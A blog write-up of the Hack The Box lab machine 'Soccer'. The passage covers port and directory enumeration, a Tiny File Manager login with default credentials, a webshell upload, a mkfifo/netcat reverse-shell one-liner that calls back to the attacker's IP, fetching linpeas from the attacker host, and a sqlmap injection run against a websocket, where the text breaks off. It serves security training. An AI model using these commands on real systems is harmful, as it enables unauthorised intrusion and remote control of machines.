---
title: Write-up Soccer on HTB
author: eMVee
date: 2024-03-08 21:30:00 +0800
categories: [CTF, HTB]
tags: [HTB, OSCP, PNPT, OSWA, SQLi, sqlmap, websocket, doas, SUID, feroxbuster, default credentials]
render_with_liquid: false
---

A few days a go I did read a blog about OSWA and in this blog the machine Soccer from Hack The Box (HTB) was recommended. When Ichecked the machine on HTB I did find out that I did not hack this machine before. Today I decided that this had to be changed.

## Getting started
Before we start we should create a work directory to store some information and assign the IP address of the target to a variable.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB]
└─$ mkdir Soccer 

┌──(emvee㉿kali)-[~/Documents/HTB]
└─$ cd Soccer 

┌──(emvee㉿kali)-[~/Documents/HTB/Soccer]
└─$ ip=10.129.214.90        
```

## Enumeration

Next steps is to see if the target is responding to a ping request.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Soccer]
└─$ ping -c 3 $ip                  
PING 10.129.214.90 (10.129.214.90) 56(84) bytes of data.
64 bytes from 10.129.214.90: icmp_seq=1 ttl=63 time=254 ms
64 bytes from 10.129.214.90: icmp_seq=2 ttl=63 time=165 ms
64 bytes from 10.129.214.90: icmp_seq=3 ttl=63 time=264 ms

--- 10.129.214.90 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2037ms
rtt min/avg/max/mdev = 164.579/227.834/264.458/44.914 ms

```
The target does respond and in the answer we can see that the value in the ttl field is 63. This is a good indicator that we are talking with a Linux machine. We should continue with a port scan so we can identify open ports and running services.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Soccer]
└─$ sudo nmap -sC -sV -T4 -A -O -p- $ip
[sudo] password for emvee: 
Starting Nmap 7.94 ( https://nmap.org ) at 2024-03-08 16:30 CET
Warning: 10.129.214.90 giving up on port because retransmission cap hit (6).
Stats: 0:02:50 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 31.20% done; ETC: 16:39 (0:06:13 remaining)
Nmap scan report for 10.129.214.90
Host is up (0.068s latency).
Not shown: 65459 closed tcp ports (reset), 73 filtered tcp ports (no-response)
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA)
|   256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA)
|_  256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soccer.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
9091/tcp open  xmltec-xmlmail?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 139
|     Date: Fri, 08 Mar 2024 15:47:04 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot GET /</pre>
|     </body>
|     </html>
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Date: Fri, 08 Mar 2024 15:47:05 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9091-TCP:V=7.94%I=7%D=3/8%Time=65EB32ED%P=x86_64-pc-linux-gnu%r(inf
SF:ormix,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\
SF:n\r\n")%r(drda,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x2
SF:0close\r\n\r\n")%r(GetRequest,168,"HTTP/1\.1\x20404\x20Not\x20Found\r\n
SF:Content-Security-Policy:\x20default-src\x20'none'\r\nX-Content-Type-Opt
SF:ions:\x20nosniff\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nCon
SF:tent-Length:\x20139\r\nDate:\x20Fri,\x2008\x20Mar\x202024\x2015:47:04\x
SF:20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=
SF:\"en\">\n<head>\n<meta\x20charset=\"utf-8\">\n<title>Error</title>\n</h
SF:ead>\n<body>\n<pre>Cannot\x20GET\x20/</pre>\n</body>\n</html>\n")%r(HTT
SF:POptions,16C,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Poli
SF:cy:\x20default-src\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\nC
SF:ontent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20143\r
SF:\nDate:\x20Fri,\x2008\x20Mar\x202024\x2015:47:05\x20GMT\r\nConnection:\
SF:x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<met
SF:a\x20charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Ca
SF:nnot\x20OPTIONS\x20/</pre>\n</body>\n</html>\n")%r(RTSPRequest,16C,"HTT
SF:P/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Policy:\x20default-sr
SF:c\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\nContent-Type:\x20t
SF:ext/html;\x20charset=utf-8\r\nContent-Length:\x20143\r\nDate:\x20Fri,\x
SF:2008\x20Mar\x202024\x2015:47:05\x20GMT\r\nConnection:\x20close\r\n\r\n<
SF:!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<meta\x20charset=\"ut
SF:f-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot\x20OPTIONS\x
SF:20/</pre>\n</body>\n</html>\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\
SF:x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2F,
SF:"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r
SF:(DNSStatusRequestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnecti
SF:on:\x20close\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:nConnection:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20400\x2
SF:0Bad\x20Request\r\nConnection:\x20close\r\n\r\n");
Aggressive OS guesses: Linux 5.0 (99%), Linux 5.0 - 5.4 (95%), HP P2000 G3 NAS device (93%), Linux 4.15 - 5.8 (93%), Linux 5.3 - 5.4 (93%), Linux 2.6.32 (92%), Linux 2.6.32 - 3.1 (92%), Infomir MAG-250 set-top box (92%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (92%), Linux 3.7 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   89.28 ms 10.10.14.1
2   95.37 ms 10.129.214.90

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1021.83 seconds

```

We have discovered a few open ports with nmap and some useful information what we have to add to our notes.
- Linux, probably Ubuntu
- Port 22
	- SSH
	- OpenSSH 8.2p1
- Port 80
	- HTTP
	- nginx 1.18.0
	- soccer.htb
- Port 9091
	- Mail?
	- xmltec-xmlmail


Let's add the domain `soccer.htb` to our `/etc/hosts` file so we can visit the website.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Soccer]
└─$ sudo nano /etc/hosts               
[sudo] password for emvee: 

┌──(emvee㉿kali)-[~/Documents/HTB/Soccer]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.214.90   soccer.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

```

We can now visit the website via the domain in the browser.

![image](/assets/img/WriteUp/HTB/Soccer/Pasted image 20240308163534.png){: width="700" height="400" }

While we looking at the website we should start enumerating directories and files on the web server as well.

```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Soccer]
└─$ feroxbuster -u http://soccer.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://soccer.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        7l       10w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      494l     1440w    96128c http://soccer.htb/ground3.jpg
200      GET      809l     5093w   490253c http://soccer.htb/ground1.jpg
200      GET     2232l     4070w   223875c http://soccer.htb/ground4.jpg
200      GET      711l     4253w   403502c http://soccer.htb/ground2.jpg
200      GET      147l      526w     6917c http://soccer.htb/
301      GET        7l       12w      178c http://soccer.htb/tiny => http://soccer.htb/tiny/
301      GET        7l       12w      178c http://soccer.htb/tiny/uploads => http://soccer.htb/tiny/uploads/
[####################] - 4m     90021/90021   0s      found:7       errors:253    
[####################] - 3m     30000/30000   162/s   http://soccer.htb/ 
[####################] - 4m     30000/30000   138/s   http://soccer.htb/tiny/ 
[####################] - 4m     30000/30000   139/s   http://soccer.htb/tiny/uploads/      
```

Feroxbuster did find some interesting directories:
- `/tiny`
- `/tiny/uploads`


Let's visit the `/tiny` directory to see what can be used.

![image](/assets/img/WriteUp/HTB/Soccer/Pasted image 20240308164248.png){: width="700" height="400" }

There is a link to the Github website of the ccc Programmers. We should investigate the content of the Github.
```
https://github.com/prasathmani/tinyfilemanager/wiki/Security-and-User-Management
```


![image](/assets/img/WriteUp/HTB/Soccer/Pasted image 20240308164426.png){: width="700" height="400" }

We have found some default credentials

- `admin:admin@123`
- `user:12345`

We can try to use those credentials in the login form to see if the default credentials are used.

![image](/assets/img/WriteUp/HTB/Soccer/Pasted image 20240308164517.png){: width="700" height="400" }

We have success while using the default credentials for the admin account. Once we are logged on we can see we can upload files to the website. Let's navigate to the uploads folder in the website.

![image](/assets/img/WriteUp/HTB/Soccer/Pasted image 20240308165806.png){: width="700" height="400" }

Next we should click on the upload button and select our `webshell.php` to upload.

![image](/assets/img/WriteUp/HTB/Soccer/Pasted image 20240308165904.png){: width="700" height="400" }

We should return to the previous screen by clicking on the `Back` link.

![image](/assets/img/WriteUp/HTB/Soccer/Pasted image 20240308170018.png){: width="700" height="400" }

The file have been uploaded. This gives us probably the ability to gain access to the system.

![image](/assets/img/WriteUp/HTB/Soccer/Pasted image 20240308170302.png){: width="700" height="400" }

Let's start a netcat listener first so we can capture a reverse shell.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Soccer]
└─$ rlwrap nc -lvp 1234
listening on [any] 1234 ...

```

When executing the command a `404` page was shown. So the file has been removed from the system. We can try it again and launch as quick as possible the command to gain a reverse shell.
First we should upload the file again. Then we should enter our command to gain a reverse shell.
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.124 1234 >/tmp/f
```
![image](/assets/img/WriteUp/HTB/Soccer/Pasted image 20240308170811.png){: width="700" height="400" }

## Initial access
Let's check our netcat listener to see if we have a connection.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Soccer]
└─$ rlwrap nc -lvp 1234
listening on [any] 1234 ...
connect to [10.10.14.124] from soccer.htb [10.129.214.90] 56458
bash: cannot set terminal process group (982): Inappropriate ioctl for device
bash: no job control in this shell
www-data@soccer:~/html/tiny/uploads$ 

```
We have a connection with the target, now the local enumeration starts on the target. We should gather as much as possible about the system.
```
www-data@soccer:~/html/tiny/uploads$ whoami;id;hostname;ip a ;pwd
whoami;id;hostname;ip a ;pwd
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
soccer
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:96:03:e6 brd ff:ff:ff:ff:ff:ff
    inet 10.129.214.90/16 brd 10.129.255.255 scope global dynamic eth0
       valid_lft 2484sec preferred_lft 2484sec
    inet6 dead:beef::250:56ff:fe96:3e6/64 scope global dynamic mngtmpaddr 
       valid_lft 86392sec preferred_lft 14392sec
    inet6 fe80::250:56ff:fe96:3e6/64 scope link 
       valid_lft forever preferred_lft forever
/var/www/html/tiny/uploads
www-data@soccer:~/html/tiny/uploads$ 

```
We are `www-data` and working in the directory were we have uploaded our webshell.
There are no other network available for us. Let's continue with enumerating information about the system.
```bash
www-data@soccer:~/html/tiny/uploads$ uname -a
uname -a
Linux soccer 5.4.0-135-generic #152-Ubuntu SMP Wed Nov 23 20:19:22 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
www-data@soccer:~/html/tiny/uploads$ cat /etc/issue
cat /etc/issue
Ubuntu 20.04.5 LTS \n \l

```

Our target is running on Ubuntu 20.04.5 and a x86_64 architecture and the kernel is Linux 5.4.0-135-generic. This information is important to have for any exploit if available. 
Let's continue with enumerating, we should focus on the users on the system.
```bash
www-data@soccer:~/html/tiny/uploads$ ls -ahlR /home
ls -ahlR /home
/home:
total 12K
drwxr-xr-x  3 root   root   4.0K Nov 17  2022 .
drwxr-xr-x 21 root   root   4.0K Dec  1  2022 ..
drwxr-xr-x  3 player player 4.0K Nov 28  2022 player

/home/player:
total 28K
drwxr-xr-x 3 player player 4.0K Nov 28  2022 .
drwxr-xr-x 3 root   root   4.0K Nov 17  2022 ..
lrwxrwxrwx 1 root   root      9 Nov 17  2022 .bash_history -> /dev/null
-rw-r--r-- 1 player player  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 player player 3.7K Feb 25  2020 .bashrc
drwx------ 2 player player 4.0K Nov 17  2022 .cache
-rw-r--r-- 1 player player  807 Feb 25  2020 .profile
lrwxrwxrwx 1 root   root      9 Nov 17  2022 .viminfo -> /dev/null
-rw-r----- 1 root   player   33 Mar  8 15:29 user.txt
ls: cannot open directory '/home/player/.cache': Permission denied

```
We have discovered a home directory for a user `player`. This user has a `user.txt` file what we should capture. We are not allowed to read the file as  `www-data`. Let's use linpease to enumerate automatically a bit. We have to host it with a python webserver so we can download it at the target.

```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Soccer]
└─$ cp /opt/linpeas/linpeas.sh .                       

┌──(emvee㉿kali)-[~/Documents/HTB/Soccer]
└─$ sudo python3 -m http.server 80  
[sudo] password for emvee: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```
First we should move to a share where we can download the file. Next we should have to add execute permissions to file.
```bash
www-data@soccer:~/html/tiny$ cd /tmp
cd /tmp
www-data@soccer:/tmp$ wget http://10.10.14.124/linpeas.sh
wget http://10.10.14.124/linpeas.sh
--2024-03-08 16:47:04--  http://10.10.14.124/linpeas.sh
Connecting to 10.10.14.124:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 848317 (828K) [text/x-sh]
Saving to: 'linpeas.sh'

     0K .......... .......... .......... .......... ..........  6% 84.7K 9s
    50K .......... .......... .......... .......... .......... 12%  148K 7s
   100K .......... .......... .......... .......... .......... 18%  242K 5s
   150K .......... .......... .......... .......... .......... 24% 96.8K 5s
   200K .......... .......... .......... .......... .......... 30% 98.3M 4s
   250K .......... .......... .......... .......... .......... 36% 49.6M 3s
   300K .......... .......... .......... .......... .......... 42%  105K 3s
   350K .......... .......... .......... .......... .......... 48%  136K 3s
   400K .......... .......... .......... .......... .......... 54% 32.2M 2s
   450K .......... .......... .......... .......... .......... 60%  281K 2s
   500K .......... .......... .......... .......... .......... 66%  158K 2s
   550K .......... .......... .......... .......... .......... 72%  163K 1s
   600K .......... .......... .......... .......... .......... 78%  203K 1s
   650K .......... .......... .......... .......... .......... 84%  128K 1s
   700K .......... .......... .......... .......... .......... 90%  147K 0s
   750K .......... .......... .......... .......... .......... 96%  166K 0s
   800K .......... .......... ........                        100%  257K=4.7s

2024-03-08 16:47:09 (177 KB/s) - 'linpeas.sh' saved [848317/848317]

www-data@soccer:/tmp$ chmod +x linpeas.sh
chmod +x linpeas.sh

```
When everything is set we can launch linpeas.
```bash
www-data@soccer:/tmp$ ./linpeas.sh
./linpeas.sh


                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄                                                                                                                                                                                 
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |                                                                                                                                                     
    |---------------------------------------------------------------------------------|                                                                                                                                                     
    |         Get the latest version    :     https://github.com/sponsors/carlospolop |                                                                                                                                                     
    |         Follow on Twitter         :     @hacktricks_live                        |                                                                                                                                                     
    |         Respect on HTB            :     SirBroccoli                             |                                                                                                                                                     
    |---------------------------------------------------------------------------------|                                                                                                                                                     
    |                                 Thank you!                                      |                                                                                                                                                     
    \---------------------------------------------------------------------------------/                                                                                                                                                     
          linpeas-ng by carlospolop                                                                                                                                                                                                         
                                                                                                                                                                                                                                            
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                                                                                                                                                                                              
                                                                                                                                                                                                                                            
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:                                                                                                                                                                                                                                    
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

< ---------- SNIP ---------- >

══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Dec  1  2022 /etc/nginx/sites-enabled                                                                                                                                                                           
drwxr-xr-x 2 root root 4096 Dec  1  2022 /etc/nginx/sites-enabled
lrwxrwxrwx 1 root root 41 Nov 17  2022 /etc/nginx/sites-enabled/soc-player.htb -> /etc/nginx/sites-available/soc-player.htb
server {
        listen 80;
        listen [::]:80;
        server_name soc-player.soccer.htb;
        root /root/app/views;
        location / {
                proxy_pass http://localhost:3000;
                proxy_http_version 1.1;
                proxy_set_header Upgrade $http_upgrade;
                proxy_set_header Connection 'upgrade';
                proxy_set_header Host $host;
                proxy_cache_bypass $http_upgrade;
        }
}
lrwxrwxrwx 1 root root 34 Nov 17  2022 /etc/nginx/sites-enabled/default -> /etc/nginx/sites-available/default
server {
        listen 80;
        listen [::]:80;
        server_name 0.0.0.0;
        return 301 http://soccer.htb$request_uri;
}
server {
        listen 80;
        listen [::]:80;
        server_name soccer.htb;
        root /var/www/html;
        index index.html tinyfilemanager.php;

        location / {
               try_files $uri $uri/ =404;
        }
        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.4-fpm.sock;
        }
        location ~ /\.ht {
                deny all;
        }
}

< ---------- SNIP ---------- >

```
Linpeas did discover a subdmoain in a configuration file. We should add it to our notes.
-  soc-player.soccer.htb

Before visiting this subdomain we should add it to the `/etc/hosts` file as well.

```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Soccer]
└─$ sudo nano /etc/hosts               

┌──(emvee㉿kali)-[~/Documents/HTB/Soccer]
└─$ cat /etc/hosts              
127.0.0.1       localhost
127.0.1.1       kali
10.129.214.90   soccer.htb soc-player.soccer.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

```
Everything is set, so we can visit the subdomain in the browser.

![image](/assets/img/WriteUp/HTB/Soccer/Pasted image 20240308175836.png){: width="700" height="400" }


It looks like there is a functionality to sign-up and logon to the website.
Let's try to register an account.

![image](/assets/img/WriteUp/HTB/Soccer/Pasted image 20240308180153.png){: width="700" height="400" }

After registration, the website refreshed to a login page. Let's try to logon with our credentials what we just have entered.


![image](/assets/img/WriteUp/HTB/Soccer/Pasted image 20240308180246.png){: width="700" height="400" }

After logon to the website we can see a ticket id. Might be there something like a SQLi vulnerability on this website?

![image](/assets/img/WriteUp/HTB/Soccer/Pasted image 20240308180421.png){: width="700" height="400" }

There is an input field present. Let's try to enter a ticket number with one number higher.

![image](/assets/img/WriteUp/HTB/Soccer/Pasted image 20240308180541.png){: width="700" height="400" }

The ticket does not exist. We should start Burpsuit and intercept the request so we can use it with SQLmap. First we should reload the page so we can see all requests to the server.
![image](/assets/img/WriteUp/HTB/Soccer/Pasted image 20240308180917.png){: width="700" height="400" }
It looks like the application is using port 9091 what we have found earlier. It looked at that specific moment that there was something running like mail. But this does explain.

Now if we try to check the Ticket ID, there is nothing shown in the interceptor. Let's check further in Burpsuit history.

![image](/assets/img/WriteUp/HTB/Soccer/Pasted image 20240308181523.png){: width="700" height="400" }

The communication has been switched to websockets, so we should check the other tab `WebSockets History`.

![image](/assets/img/WriteUp/HTB/Soccer/Pasted image 20240308182355.png){: width="700" height="400" }
There are multple requests and responses in this tab. Let's check some details about the requests .

![image](/assets/img/WriteUp/HTB/Soccer/Pasted image 20240308182522.png){: width="700" height="400" }

It looks like there is a json request sent to the server. We might be able to find a SQLi vulnerability with sqlmap. Since we are talking to a a websocket we should tell sqlmap this explicitly. Let's find out if we can find a SQLi vulnerability with sqlmap.

```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Soccer]
└─$ sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id": "94530"}' --dbms mysql --batch --level 5 --risk 3
        ___
       __H__                                                                             ___ ___[,]_____ ___ ___  {1.7.8#stable}                    
|_ -| . ["]     | .'| . |                                   
|___|_  [,]_|_|_|__,|  _|                                   
      |_|V...       |_|   https://sqlmap.org                   

[*] starting @ 18:27:07 /2024-03-08/

JSON data found in POST body. Do you want to process it? [Y/n/q] Y
[18:27:07] [INFO] testing connection to the target URL
[18:27:11] [INFO] checking if the target is protected by some kind of WAF/IPS
[18:27:11] [INFO] testing if the target URL content is stable
[18:27:11] [INFO] target URL content is stable
[18:27:11] [INFO] testing if (custom) POST parameter 'JSON id' is dynamic
[18:27:11] [INFO] (custom) POST parameter 'JSON id' appears to be dynamic
[18:27:12] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'JSON id' might not be injectable
[18:27:12] [INFO] testing for SQL injection on (custom) POST parameter 'JSON id'
[18:27:12] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:27:16] [INFO] (custom) POST parameter 'JSON id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
[18:27:16] [INFO] testing 'Generic inline queries'
[18:27:17] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[18:27:17] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[18:27:17] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[18:27:17] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[18:27:18] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[18:27:18] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[18:27:18] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[18:27:18] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[18:27:18] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[18:27:19] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[18:27:19] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:27:19] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:27:19] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[18:27:20] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[18:27:20] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[18:27:20] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[18:27:20] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[18:27:21] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[18:27:21] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[18:27:21] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[18:27:22] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
